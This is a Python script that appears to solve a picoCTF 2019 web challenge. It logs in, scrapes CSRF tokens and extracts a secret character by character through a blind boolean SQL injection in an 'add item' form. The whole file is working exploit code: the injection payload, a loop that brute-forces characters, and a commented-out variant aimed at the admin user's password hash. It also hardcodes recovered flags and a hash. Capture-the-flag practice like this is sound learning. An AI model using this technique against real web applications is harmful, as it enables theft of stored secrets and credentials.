import sys, requests

info = lambda x: print("\033[92;1m" + x + "\033[m")
URL = "https://2019shell1.picoctf.com/problem/27357/"
URL_LOGIN = URL + "login"
URL_CHECK = URL + "list_items"
URL_SQLIN = URL + "add_item"
sqli = "' or (select secret from user where secret like '{}{}%}}' escape '\\' limit 1) or '"
# sqli = "' or (select secret from user where username = 'admin' and password_hash like '{}{}%') or '"
chars = "0123456789abcdefghijklmnopqrstuvwxyz ~?-+$#!@.:}_"
flag = "picoCTF{WH00T_IT_A_SQL_INJECT_"
flag = "picoctf{wh00t_it_a_sql_inject_899be1"
flag = "picoCTF{wh00t_it"
hsh = "pbkdf2:sha256:150000_9zdeptrm_9620a7f60d56ab01d49052490735ea62c24a86a1ca7b79fc8a8"

FLAG = "picoCTF{wh00t_it_a_sql_inject9899be1a}"
QUERY = "' or (select secret from user where secret like 'picoCTF{wh00t\_it\_a\_sql\_inject9899be1a}%' escape '\') or '"

s = requests.Session()
r = s.get(URL_LOGIN).text
csrf = r.split('name="csrf_token" type="hidden" value="')[1].split('">')[0]
login_data = {"username": "qwerty", "password": "qwerty", "csrf_token": csrf}
s.post(URL_LOGIN, data=login_data)
info("Logged in")

try:
    # while flag[-1] != "}":
    # while 1:
    for i in range(94):
        for i in chars:
        # for i in "$:.-+1234567890abcdefghijklmnopqrstuvwxyz_":
            c = i
            if i == "-":
                c = "\\" + i
            # info("Trying " + i)
            print(flag + i, end="\r")
            sys.stdout.flush()
            r = s.get(URL_SQLIN).text
            csrf = r.split('name="csrf_token" type="hidden" value="')[1].split('">')[0]
            data = {"item": sqli.format(flag, c), "csrf_token": csrf, "submit": "Create"}
            r = s.post(URL_SQLIN, data=data)
            r = s.get(URL_CHECK).text
            status = r.split("Urgent:</strong>")[-1].split("</li>")[0].strip()
            # info("Status: " + status)
            if status == "0":
                flag += i
                # info("Correct character: " + i)
                break
except KeyboardInterrupt:
    print("\n\n" + flag + "\n\n")

print(flag)
